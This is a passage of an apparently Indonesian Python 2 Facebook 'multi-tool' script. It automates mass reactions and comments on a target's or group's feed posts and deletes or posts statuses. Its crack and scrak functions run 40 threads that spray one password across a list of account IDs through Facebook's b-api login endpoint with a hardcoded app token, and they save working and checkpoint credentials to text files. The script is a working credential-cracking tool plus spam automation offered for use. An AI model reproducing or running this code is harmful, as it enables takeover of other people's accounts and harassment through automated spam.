        print '\x1b[1;91m[!] Jangan kosong'
        bot_pilih()
    elif bots == '1':
        menu_react()
    elif bots == '2':
        bot_komen()
    elif bots == '3':
        bot_kgrup()
    elif bots == '4':
        deletepost()
    elif bots == '0':
        menu()
    else:
        print '\x1b[1;91m[!] \x1b[1;93m' + bots + ' \x1b[1;97mTidak ada'
        bot_pilih()


def menu_react():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;96m[\x1b[1;97m1.\x1b[1;96m] \x1b[1;97mLike  \x1b[1;96m(y)'
    print '\x1b[1;96m[\x1b[1;97m2.\x1b[1;96m] \x1b[1;97mLove  \x1b[1;95m<3'
    print '\x1b[1;96m[\x1b[1;97m3.\x1b[1;96m] \x1b[1;97mWow   \x1b[1;94m:0'
    print '\x1b[1;96m[\x1b[1;97m4.\x1b[1;96m] \x1b[1;97mHaha  \x1b[1;93m:v'
    print '\x1b[1;96m[\x1b[1;97m5.\x1b[1;96m] \x1b[1;97mSedih \x1b[1;96m:('
    print '\x1b[1;96m[\x1b[1;97m6.\x1b[1;96m] \x1b[1;97mMarah \x1b[1;91m>:('
    print '\x1b[1;96m[\x1b[1;97m0.\x1b[1;96m]\x1b[1;91m Kembali'
    print
    react_pilih()


def react_pilih():
    global tipe
    aksi = raw_input('\x1b[1;91m(_)(_)====\x1b[1;97mD ')
    if aksi == '':
        print '\x1b[1;91m[!] Jangan kosong'
        react_pilih()
    elif aksi == '1':
        tipe = 'LIKE'
        react()
    elif aksi == '2':
        tipe = 'LOVE'
        react()
    elif aksi == '3':
        tipe = 'WOW'
        react()
    elif aksi == '4':
        tipe = 'HAHA'
        react()
    elif aksi == '5':
        tipe = 'SAD'
        react()
    elif aksi == '6':
        tipe = 'ANGRY'
        react()
    elif aksi == '0':
        menu_bot()
    else:
        print '\x1b[1;91m[!] \x1b[1;93m' + bots + ' \x1b[1;97mTidak ada'
        react_pilih()


def react():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        o = []
        os.system('reset')
        print logo
        print 40 * '\x1b[1;97m='
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mMasukan limit \x1b[1;91m:\x1b[1;97m ')
        print 40 * '\x1b[1;97m='
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[+]\x1b[1;92m Mulai\x1b[1;97m ...')
            print
            print 40 * '\x1b[1;97m='
            for a in ah['feed']['data']:
                y = a['id']
                o.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(o))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            react_pilih()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ada'
            time.sleep(1)
            react()


def bot_komen():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        j = []
        os.system('reset')
        print logo
        print 40 * '\x1b[1;97m='
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mKomentar  \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mMasukan limit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        print 40 * '\x1b[1;97m='
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[+]\x1b[1;92m Mulai\x1b[1;97m ...')
            print
            print 40 * '\x1b[1;97m='
            for s in a['feed']['data']:
                f = s['id']
                j.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(j))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ada'
            time.sleep(1)
            bot_komen()


def bot_kgrup():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print logo
        print 40 * '\x1b[1;97m='
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup  \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mKomentar \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mMasukan limit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[1;91m[+] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            print 40 * '\x1b[1;97m='
            lah = []
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[+]\x1b[1;92m Mulai\x1b[1;97m ...')
            print
            print 40 * '\x1b[1;97m='
            for s in a['feed']['data']:
                f = s['id']
                lah.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(lah))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak ada'
            tanya_g()


def tanya_g():
    tgrup = raw_input('\x1b[1;91m[!] \x1b[1;92mIngin melihat daftar grup \x1b[1;97m(y/t): ')
    if tgrup == '':
        print '\x1b[1;91m[!] Pilih\x1b[1;97m y/n'
        tanya_g()
    elif tgrup == 'y':
        list_grup()
    elif tgrup == 'Y':
        list_grup()
    elif tgrup == 't':
        menu_bot()
    elif tgrup == 'T':
        menu_bot()
    else:
        print '\x1b[1;91m[!] Pilih\x1b[1;97m y/n'
        tanya_g()


def deletepost():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m[+] \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
    jalan('\x1b[1;91m[+] \x1b[1;92mMulai menghapus postingan unfaedah\x1b[1;97m ...')
    print
    print 40 * '\x1b[1;97m='
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mGagal'
        except TypeError:
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mTerhapus'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Koneksi Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_bot()


def status():
    global toket
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        token()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    status_masuk()


def status_masuk():
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mKetik status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print '\x1b[1;91m[!] Jangan kosong'
        status_masuk()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[1;91m[+] \x1b[1;92mMengirim\x1b[1;97m ...')
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()


def crack():
    global file
    global idlist
    global passw
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print logo
        print 40 * '\x1b[1;97m='
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            threads = []
            jalan('\x1b[1;91m[?] \x1b[1;92mPastikan koneksi internet anda super greget\x1b[1;97m ...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        back = 0
        berhasil = []
        cekpoint = []
        gagal = []
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[32mUsername \x1b[1;97m: ' + username + ' | \x1b[1;92mPassword \x1b[1;97m: ' + passw)
                back += 1
            if 'www.facebook.com' in mpsh:
                cek = open('Cekpoint.txt', 'w')
                cek.write(username + ' | ' + passw + '\n')
                cek.close()
                cekpoint.append('\x1b[32mUsername \x1b[1;97m: ' + username + ' | \x1b[1;92mPassword \x1b[1;97m: ' + passw)
                back += 1
            else:
                gagal.append(username)
                back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;93m' + str(len(cekpoint)) + '\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive \x1b[1;91m:\x1b[1;96m ' + str(len(berhasil)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Koneksi Error'
        time.sleep(1)


def hasil():
    print
    print 40 * '\x1b[1;97m='
    print '\x1b[32m[\x1b[31m+\x1b[32m] \x1b[1;92mBerhasil   \x1b[1;97m--> ' + str(len(berhasil))
    for b in berhasil:
        print b

    print '\x1b[33m[\x1b[31m+\x1b[33m] \x1b[1;93mCheckpoint \x1b[1;97m--> ' + str(len(cekpoint))
    for c in cekpoint:
        print c

    print '\x1b[31m[+] Gagal      \x1b[1;97m--> ' + str(len(gagal))
    print
    keluar()


